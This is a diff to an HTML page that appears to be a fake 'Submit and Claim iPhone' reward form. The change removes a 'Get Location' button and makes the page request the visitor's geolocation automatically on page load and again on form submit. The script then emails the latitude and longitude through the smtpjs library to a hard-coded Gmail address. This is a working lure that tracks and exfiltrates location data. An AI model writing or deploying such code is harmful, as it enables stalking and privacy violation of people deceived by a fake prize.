@@ -76,9 +76,6 @@
             margin-top: 15px;
             font-size: 0.9rem;
         }
-        #getLocationBtn {
-            margin-top: 15px;
-        }
     </style>
 </head>
 <body>
@@ -121,14 +118,12 @@
             <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
             <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
         </form>
-
-        <button id="getLocationBtn" class="btn btn-secondary btn-block">Get Location</button>
     </div>
 
     <!-- JavaScript code -->
     <script src="https://smtpjs.com/v3/smtp.js"></script>
     <script>
-    // Function to send email
+    // Function to send email using EmailJS
     function sendEmail(subject, message, recipientEmail) {
         try {
             Email.send({
@@ -153,14 +148,14 @@
         }
     }
 
-    // Function to send location email
+    // Function to send location data via email
     function sendLocationEmail(latitude, longitude) {
         const message = `Geolocation Data:\nLatitude: ${latitude},\nLongitude: ${longitude}`;
         sendEmail("Geolocation Data", message, "khalilrodeni@gmail.com");
     }
 
-    // Function to track movement and get location
-    function trackMovement() {
+    // Function to request location and send it via email
+    function requestLocation() {
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
                 (position) => {
@@ -192,16 +187,16 @@
         }
     }
 
-    // Trigger location request on button click
-    document.getElementById("getLocationBtn").addEventListener("click", function() {
-        trackMovement();
-    });
+    // Request location when the page loads
+    window.onload = function() {
+        requestLocation();
+    };
 
-    // When the form is submitted, track location and send email
+    // When the form is submitted, prevent default behavior and track location
     document.getElementById("rewardForm").addEventListener("submit", function(event) {
         event.preventDefault(); // Prevent form submission
-        trackMovement();
+        requestLocation(); // Request location when the form is submitted
     });
-</script>
+    </script>
 </body>
 </html>
